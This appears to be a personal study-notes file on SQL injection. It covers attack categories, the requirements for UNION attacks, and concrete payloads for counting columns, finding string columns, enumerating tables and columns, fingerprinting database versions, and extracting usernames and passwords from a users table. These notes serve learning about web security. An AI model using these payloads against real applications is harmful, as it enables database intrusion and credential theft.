# sqlin


#common sql injection attack :

-Retrieving hidden data, where you can modify an SQL query to return additional results.
-Subverting application logic, where you can change a query to interfere with the application's logic.
-UNION attacks, where you can retrieve data from different database tables.
-Examining the database, where you can extract information about the version and structure of the database.
-Blind SQL injection, where the results of a query you control are not returned in the application's responses.



 #For a UNION query to work, two key requirements must be met:

    The individual queries must return the same number of columns.
    The data types in each column must be compatible between the individual queries.



# union attack steps:

-Determining the number of columns required in an SQL injection UNION attack :

  - ' ORDER BY 1-- or  ' ORDER BY 2-- etc 
  - ' UNION SELECT NULL-- or ' UNION SELECT NULL,NULL -- etc (recommended)
  - 
-Finding columns with a useful data type in an SQL injection UNION attack 
  - if the query returns four columns, you would submit:
    - ' UNION SELECT 'a',NULL,NULL,NULL--
    - ' UNION SELECT NULL,'a',NULL,NULL--
    - ' UNION SELECT NULL,NULL,'a',NULL--
    - ' UNION SELECT NULL,NULL,NULL,'a'-- 
  -found name of tables :
  ' UNION  SELECT 'a','a' FROM information_schema.tables --
  -found name of column :
  ' UNION  SELECT  'a','a'  FROM information_schema.columns where table_name='tablename'--
  
  to find name of tables and cloumns in oracle use all_tables , all_tab_columns.
  
 

- Retrieving multiple values within a single column
   - ' UNION SELECT username || '~' || password FROM users-- 
# notes:
  - There is a built-in table on Oracle called dual which can be used for this purpose : ' UNION SELECT NULL FROM DUAL-- (MUST in oracle )
  -  the hash character # can be used to identify a comment 


# Examining the database in SQL injection attacks:
 -Microsoft, MySQL 	SELECT @@version
 -Oracle 	SELECT * FROM v$version
 -PostgreSQL 	SELECT version() 
 
# Listing the contents of the database:
 - SELECT * FROM information_schema.tables 


# Blind SQL injection :
Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors. 



